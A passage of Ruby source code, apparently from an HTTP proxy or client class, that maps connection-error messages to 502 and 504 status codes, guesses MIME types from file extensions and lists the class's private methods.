        # This likely indicates a HTTPS connection to a plain-text HTTP or non-HTTP service
        elsif response =~ /WebException: The underlying connection was closed: An unexpected error occurred on a send/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        # The operation has timed out
        elsif response =~ /WebException: The operation has timed out/
          result['code'] = 504
          result['message'] = 'Timeout'
        end
      # Generic error messages
      elsif response =~ /(Connection refused|No route to host|Connection timed out) - connect\(\d\)/
        # Connection refused
        if response =~ /Connection refused - connect\(\d\)/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        # No route to host
        elsif response =~ /No route to host - connect\(\d\)/
          result['code'] = 502
          result['message'] = 'Bad Gateway'
        # Connection timed out
        elsif response =~ /Connection timed out - connect\(\d\)/
          result['code'] = 504
          result['message'] = 'Timeout'
        end
      end
      result
    end

    #
    # Guess content type based on file extension
    #
    # @param [String] ext File extension including dots
    #
    # @example Return mime type for extension '.png'
    #   guess_mime('favicon.png')
    #
    # @return [String] content-type value
    #
    def guess_mime(ext)
      content_types = WEBrick::HTTPUtils::DefaultMimeTypes
      common_content_types = { 'ico' => 'image/x-icon' }
      content_types.merge!(common_content_types)
      content_types.each do |k, v|
        return v.to_s if ext.eql?(".#{k}")
      end
      nil
    end

    # private methods
    private :parse_options,
            :send_http_request,
            :run_rules,
            :encode_ip,
            :guess_mime,
            :guess_status
  end
end
